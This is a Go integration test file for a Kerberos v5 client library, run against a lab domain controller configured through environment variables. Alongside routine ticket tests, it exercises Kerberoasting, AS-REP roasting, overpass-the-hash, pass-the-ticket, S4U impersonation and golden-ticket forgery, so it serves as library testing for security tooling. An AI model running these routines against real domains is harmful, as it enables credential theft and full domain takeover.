//go:build integration

// Live integration coverage for the native (stdlib-only) Kerberos v5 client
// against a real KDC / domain controller. Excluded from the default build by the
// "integration" tag; every test skips cleanly when its configuration is not
// provided in the environment, so `go test -tags integration ./...` is a no-op
// unless a lab is configured.
//
// Baseline configuration (drives the always-on paths):
//
//	KRB5_TEST_KDC     KDC / domain-controller host or IP (e.g. 10.0.0.10)
//	KRB5_TEST_REALM   Kerberos realm / AD domain (e.g. EXAMPLE.LOCAL)
//	KRB5_TEST_USER    account sAMAccountName (e.g. Administrator)
//	KRB5_TEST_PASS    account password
//	KRB5_TEST_SPN     a service principal name that exists in the domain and the
//	                  account may request (e.g. ldap/dc.example.local). Used for
//	                  GetTGS / Kerberoast.
//
// Optional configuration (each unlocks a path that a vanilla single-domain lab
// cannot exercise; the test skips when the variable is unset):
//
//	KRB5_TEST_KEYTAB       path to a .keytab for the account (keytab GetTGT)
//	KRB5_TEST_ASREP_USER   an account with pre-authentication disabled (ASREPRoast)
//	KRB5_TEST_FAST         set to 1 to exercise the FAST-armored AS-REQ (requires
//	                       the KDC to advertise Kerberos armoring)
//	KRB5_TEST_S4U_SPN      target SPN the account is trusted to delegate to
//	                       (S4U2Self -> S4U2Proxy constrained delegation)
//	KRB5_TEST_S4U_USER     user to impersonate for S4U (defaults to KRB5_TEST_USER)
//	KRB5_TEST_KRBTGT_KEY   krbtgt AES256 (or RC4) key, hex, for the golden-ticket
//	                       forge->use path
//	KRB5_TEST_DOMAIN_SID   account-domain SID (for golden forge)
//
// Example:
//
//	KRB5_TEST_KDC=10.0.0.10 KRB5_TEST_REALM=EXAMPLE.LOCAL \
//	KRB5_TEST_USER=Administrator KRB5_TEST_PASS='…' \
//	KRB5_TEST_SPN=ldap/dc.example.local \
//	  go test -tags integration -v -run TestLiveKerberos ./network/kerberos/v5/
package kerberos_test

import (
	"encoding/hex"
	"os"
	"strings"
	"testing"

	kerberos "github.com/TheManticoreProject/Manticore/network/kerberos/v5"
	kerbcrypto "github.com/TheManticoreProject/Manticore/network/kerberos/v5/crypto"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/messages"
)

// krbEnv holds the resolved baseline configuration.
type krbEnv struct {
	KDC   string
	Realm string
	User  string
	Pass  string
	SPN   string
}

// requireKrbEnv returns the baseline Kerberos test configuration, skipping the
// test if the mandatory variables are not all set.
func requireKrbEnv(t *testing.T) krbEnv {
	t.Helper()
	e := krbEnv{
		KDC:   os.Getenv("KRB5_TEST_KDC"),
		Realm: os.Getenv("KRB5_TEST_REALM"),
		User:  os.Getenv("KRB5_TEST_USER"),
		Pass:  os.Getenv("KRB5_TEST_PASS"),
		SPN:   os.Getenv("KRB5_TEST_SPN"),
	}
	if e.KDC == "" || e.Realm == "" || e.User == "" || e.Pass == "" {
		t.Skip("set KRB5_TEST_KDC/KRB5_TEST_REALM/KRB5_TEST_USER/KRB5_TEST_PASS to run the live Kerberos tests")
	}
	return e
}

// newClient builds a password-authenticated client for the baseline account.
func (e krbEnv) newClient() *kerberos.KerberosClient {
	return kerberos.NewClient(e.User, e.Realm, e.KDC).WithPassword(e.Pass)
}

// TestLiveKerberos_GetTGT_Password obtains a TGT with a password.
func TestLiveKerberos_GetTGT_Password(t *testing.T) {
	e := requireKrbEnv(t)
	c := e.newClient()
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT(password): %v", err)
	}
	if !c.HasTGT() {
		t.Fatal("GetTGT(password) reported success but HasTGT() is false")
	}
	t.Logf("[ok] TGT acquired for %s@%s", c.Username(), c.Realm())
}

// TestLiveKerberos_GetTGT_NTHash derives the account's RC4 (NT) key from the
// password and obtains a TGT with it (overpass-the-hash).
func TestLiveKerberos_GetTGT_NTHash(t *testing.T) {
	e := requireKrbEnv(t)
	ntKey, err := kerbcrypto.StringToKey(messages.ETypeRC4HMAC, e.Pass, "", nil)
	if err != nil {
		t.Fatalf("derive NT hash: %v", err)
	}
	c := kerberos.NewClient(e.User, e.Realm, e.KDC)
	if err := c.WithNTHash(hex.EncodeToString(ntKey)); err != nil {
		t.Fatalf("WithNTHash: %v", err)
	}
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT(NT hash): %v", err)
	}
	t.Logf("[ok] TGT acquired from NT hash for %s", c.Username())
}

// TestLiveKerberos_GetTGT_AESKey derives the account's AES256 key from the
// password with the default AD salt (REALM+username) and obtains a TGT with it
// (pass-the-key).
func TestLiveKerberos_GetTGT_AESKey(t *testing.T) {
	e := requireKrbEnv(t)
	salt := strings.ToUpper(e.Realm) + e.User
	aesKey, err := kerbcrypto.StringToKey(messages.ETypeAES256CTSHMACSHA196, e.Pass, salt, nil)
	if err != nil {
		t.Fatalf("derive AES256 key: %v", err)
	}
	c := kerberos.NewClient(e.User, e.Realm, e.KDC)
	if err := c.WithAESKey(hex.EncodeToString(aesKey)); err != nil {
		t.Fatalf("WithAESKey: %v", err)
	}
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT(AES key): %v (the default salt REALM+username may not match this account)", err)
	}
	t.Logf("[ok] TGT acquired from AES256 key for %s", c.Username())
}

// TestLiveKerberos_GetTGT_Keytab obtains a TGT from a keytab. Skipped unless
// KRB5_TEST_KEYTAB points at a keytab for the account.
func TestLiveKerberos_GetTGT_Keytab(t *testing.T) {
	e := requireKrbEnv(t)
	path := os.Getenv("KRB5_TEST_KEYTAB")
	if path == "" {
		t.Skip("set KRB5_TEST_KEYTAB to a .keytab for the account to run the keytab TGT test")
	}
	c := kerberos.NewClient(e.User, e.Realm, e.KDC)
	if err := c.WithKeytabFile(path); err != nil {
		t.Fatalf("WithKeytabFile: %v", err)
	}
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT(keytab): %v", err)
	}
	t.Logf("[ok] TGT acquired from keytab for %s", c.Username())
}

// TestLiveKerberos_GetTGS requests a service ticket for KRB5_TEST_SPN.
func TestLiveKerberos_GetTGS(t *testing.T) {
	e := requireKrbEnv(t)
	if e.SPN == "" {
		t.Skip("set KRB5_TEST_SPN to a service principal name to run the GetTGS test")
	}
	c := e.newClient()
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT: %v", err)
	}
	ticket, ticketRaw, key, keyEType, err := c.GetTGS(e.SPN, true)
	if err != nil {
		t.Fatalf("GetTGS(%q): %v", e.SPN, err)
	}
	if len(ticketRaw) == 0 || len(key) == 0 {
		t.Fatalf("GetTGS(%q) returned empty ticket/key", e.SPN)
	}
	t.Logf("[ok] service ticket for %s: sname=%v keyEType=%d", e.SPN, ticket.SName.NameString, keyEType)
}

// TestLiveKerberos_Kerberoast roasts KRB5_TEST_SPN (returns the service ticket's
// encrypted part for offline cracking).
func TestLiveKerberos_Kerberoast(t *testing.T) {
	e := requireKrbEnv(t)
	if e.SPN == "" {
		t.Skip("set KRB5_TEST_SPN to run the Kerberoast test")
	}
	c := e.newClient()
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT: %v", err)
	}
	res, err := c.Kerberoast(e.SPN)
	if err != nil {
		t.Fatalf("Kerberoast(%q): %v", e.SPN, err)
	}
	if len(res.Cipher) == 0 {
		t.Fatalf("Kerberoast(%q) returned no cipher text", e.SPN)
	}
	t.Logf("[ok] roasted %s: etype=%d cipherLen=%d", res.SPN, res.EType, len(res.Cipher))
}

// TestLiveKerberos_ASREPRoast roasts a pre-auth-disabled account. Skipped unless
// KRB5_TEST_ASREP_USER names such an account (a vanilla domain has none).
func TestLiveKerberos_ASREPRoast(t *testing.T) {
	e := requireKrbEnv(t)
	user := os.Getenv("KRB5_TEST_ASREP_USER")
	if user == "" {
		t.Skip("set KRB5_TEST_ASREP_USER to a pre-auth-disabled account to run the ASREPRoast test")
	}
	res, err := kerberos.ASREPRoast(user, e.Realm, e.KDC)
	if err != nil {
		t.Fatalf("ASREPRoast(%q): %v", user, err)
	}
	if len(res.CipherText) == 0 {
		t.Fatalf("ASREPRoast(%q) returned no cipher text", user)
	}
	t.Logf("[ok] AS-REP roast %s: etype=%d cipherLen=%d", res.Username, res.EncryptionType, len(res.CipherText))
}

// TestLiveKerberos_ExportImportKirbi exports the TGT as a .kirbi (KRB-CRED),
// imports it into a fresh client that holds no secret, and uses it to obtain a
// service ticket (pass-the-ticket).
func TestLiveKerberos_ExportImportKirbi(t *testing.T) {
	e := requireKrbEnv(t)
	if e.SPN == "" {
		t.Skip("set KRB5_TEST_SPN to run the kirbi export/import pass-the-ticket test")
	}
	c := e.newClient()
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT: %v", err)
	}
	kirbi, err := c.ExportTGTKirbi()
	if err != nil {
		t.Fatalf("ExportTGTKirbi: %v", err)
	}

	ptt := kerberos.NewClient(e.User, e.Realm, e.KDC) // no password/hash
	if err := ptt.LoadTGTFromKirbiBytes(kirbi); err != nil {
		t.Fatalf("LoadTGTFromKirbiBytes: %v", err)
	}
	if !ptt.HasTGT() {
		t.Fatal("imported client has no TGT")
	}
	if _, _, _, _, err := ptt.GetTGS(e.SPN, true); err != nil {
		t.Fatalf("GetTGS with imported kirbi TGT: %v", err)
	}
	t.Logf("[ok] kirbi export -> import -> pass-the-ticket GetTGS(%s)", e.SPN)
}

// TestLiveKerberos_ExportImportCCache exports the TGT as an MIT ccache, marshals
// it, re-parses and imports it into a fresh client, and uses it (pass-the-ticket).
func TestLiveKerberos_ExportImportCCache(t *testing.T) {
	e := requireKrbEnv(t)
	if e.SPN == "" {
		t.Skip("set KRB5_TEST_SPN to run the ccache export/import pass-the-ticket test")
	}
	c := e.newClient()
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT: %v", err)
	}
	cc, err := c.ExportTGTCCache()
	if err != nil {
		t.Fatalf("ExportTGTCCache: %v", err)
	}
	blob, err := cc.Marshal()
	if err != nil {
		t.Fatalf("ccache Marshal: %v", err)
	}

	ptt := kerberos.NewClient(e.User, e.Realm, e.KDC)
	if err := ptt.LoadTGTFromCCacheBytes(blob); err != nil {
		t.Fatalf("LoadTGTFromCCacheBytes: %v", err)
	}
	if _, _, _, _, err := ptt.GetTGS(e.SPN, true); err != nil {
		t.Fatalf("GetTGS with imported ccache TGT: %v", err)
	}
	t.Logf("[ok] ccache export -> import -> pass-the-ticket GetTGS(%s)", e.SPN)
}

// TestLiveKerberos_S4U exercises S4U2Self followed by S4U2Proxy (constrained
// delegation). Skipped unless KRB5_TEST_S4U_SPN names a target the account is
// trusted to delegate to (msDS-AllowedToDelegateTo) — not present on a vanilla
// domain.
func TestLiveKerberos_S4U(t *testing.T) {
	e := requireKrbEnv(t)
	targetSPN := os.Getenv("KRB5_TEST_S4U_SPN")
	if targetSPN == "" {
		t.Skip("set KRB5_TEST_S4U_SPN (a constrained-delegation target) to run the S4U test")
	}
	impersonate := os.Getenv("KRB5_TEST_S4U_USER")
	if impersonate == "" {
		impersonate = e.User
	}
	c := e.newClient()
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT: %v", err)
	}
	_, selfRaw, _, err := c.S4U2Self(impersonate, e.Realm)
	if err != nil {
		t.Fatalf("S4U2Self(%q): %v", impersonate, err)
	}
	ticket, proxyRaw, _, err := c.S4U2Proxy(targetSPN, selfRaw)
	if err != nil {
		t.Fatalf("S4U2Proxy(%q): %v", targetSPN, err)
	}
	if len(proxyRaw) == 0 {
		t.Fatalf("S4U2Proxy(%q) returned empty ticket", targetSPN)
	}
	t.Logf("[ok] S4U2Self(%s) -> S4U2Proxy(%s): sname=%v", impersonate, targetSPN, ticket.SName.NameString)
}

// TestLiveKerberos_GoldenForgeUse forges a golden TGT from the krbtgt key and
// uses it to obtain a real service ticket from the KDC. Skipped unless the krbtgt
// key and domain SID are supplied (a vanilla lab operator does not hand them out).
func TestLiveKerberos_GoldenForgeUse(t *testing.T) {
	e := requireKrbEnv(t)
	keyHex := os.Getenv("KRB5_TEST_KRBTGT_KEY")
	domainSID := os.Getenv("KRB5_TEST_DOMAIN_SID")
	if keyHex == "" || domainSID == "" || e.SPN == "" {
		t.Skip("set KRB5_TEST_KRBTGT_KEY, KRB5_TEST_DOMAIN_SID and KRB5_TEST_SPN to run the golden forge->use test")
	}
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		t.Fatalf("decode KRB5_TEST_KRBTGT_KEY: %v", err)
	}
	keyEType := messages.ETypeAES256CTSHMACSHA196
	if len(key) == 16 {
		keyEType = messages.ETypeRC4HMAC
	}
	forged, err := kerberos.ForgeGolden(kerberos.ForgeOptions{
		Realm:           e.Realm,
		Username:        e.User,
		DomainSID:       domainSID,
		UserRID:         500,
		LogonDomainName: strings.SplitN(strings.ToUpper(e.Realm), ".", 2)[0],
		Key:             key,
		KeyEType:        keyEType,
	})
	if err != nil {
		t.Fatalf("ForgeGolden: %v", err)
	}
	c := kerberos.NewClient(e.User, e.Realm, e.KDC)
	if err := c.LoadTGTFromKirbiBytes(mustKirbi(t, forged)); err != nil {
		t.Fatalf("import forged golden TGT: %v", err)
	}
	if _, _, _, _, err := c.GetTGS(e.SPN, true); err != nil {
		t.Fatalf("GetTGS with forged golden TGT: %v", err)
	}
	t.Logf("[ok] golden TGT forged and used to obtain %s", e.SPN)
}

func mustKirbi(t *testing.T, f *kerberos.ForgedTicket) []byte {
	t.Helper()
	b, err := f.KirbiBytes()
	if err != nil {
		t.Fatalf("KirbiBytes: %v", err)
	}
	return b
}

// TestLiveKerberos_FAST obtains a TGT over a FAST-armored AS-REQ (RFC 6113),
// armoring with a second TGT for the same account. Skipped unless KRB5_TEST_FAST
// is set (Kerberos armoring is not enabled on a vanilla KDC).
func TestLiveKerberos_FAST(t *testing.T) {
	e := requireKrbEnv(t)
	if os.Getenv("KRB5_TEST_FAST") == "" {
		t.Skip("set KRB5_TEST_FAST=1 to run the FAST-armored AS-REQ test (requires KDC armoring support)")
	}
	armor := e.newClient()
	if err := armor.GetTGT(); err != nil {
		t.Fatalf("armor GetTGT: %v", err)
	}
	c := e.newClient().WithFASTArmorFromClient(armor)
	if !c.FASTEnabled() {
		t.Fatal("FASTEnabled() is false after WithFASTArmorFromClient")
	}
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT(FAST): %v", err)
	}
	t.Logf("[ok] FAST-armored TGT acquired for %s", c.Username())
}

// TestLiveKerberos_FAST_GetTGS exercises RFC 6113 FAST armoring on the TGS
// exchange: a FAST-enabled client acquires its TGT over an armored AS-REQ, then
// requests a service ticket for KRB5_TEST_SPN over an armored TGS-REQ (the TGT is
// its own armor; the armor key is derived from the subkey in the PA-TGS-REQ
// authenticator). Skipped unless KRB5_TEST_FAST and KRB5_TEST_SPN are set.
func TestLiveKerberos_FAST_GetTGS(t *testing.T) {
	e := requireKrbEnv(t)
	if os.Getenv("KRB5_TEST_FAST") == "" {
		t.Skip("set KRB5_TEST_FAST=1 to run the FAST-armored TGS-REQ test (requires KDC armoring support)")
	}
	if e.SPN == "" {
		t.Skip("set KRB5_TEST_SPN to a service principal name to run the FAST GetTGS test")
	}

	armor := e.newClient()
	if err := armor.GetTGT(); err != nil {
		t.Fatalf("armor GetTGT: %v", err)
	}
	c := e.newClient().WithFASTArmorFromClient(armor)
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT(FAST): %v", err)
	}

	ticket, ticketRaw, key, keyEType, err := c.GetTGS(e.SPN, true)
	if err != nil {
		t.Fatalf("FAST GetTGS(%q): %v", e.SPN, err)
	}
	if len(ticketRaw) == 0 || len(key) == 0 {
		t.Fatalf("FAST GetTGS(%q) returned empty ticket/key", e.SPN)
	}
	t.Logf("[ok] FAST-armored service ticket for %s (sname=%v, session etype=%d)",
		e.SPN, ticket.SName.NameString, keyEType)
}

// TestLiveKerberos_Renew acquires a renewable TGT and renews it.
func TestLiveKerberos_Renew(t *testing.T) {
	e := requireKrbEnv(t)
	c := e.newClient()
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT: %v", err)
	}
	if err := c.Renew(); err != nil {
		t.Fatalf("Renew: %v", err)
	}
	// The renewed TGT must still be usable for a TGS exchange.
	if e.SPN != "" {
		if _, _, _, _, err := c.GetTGS(e.SPN, true); err != nil {
			t.Fatalf("GetTGS after Renew: %v", err)
		}
	}
	t.Logf("[ok] TGT renewed and still usable")
}
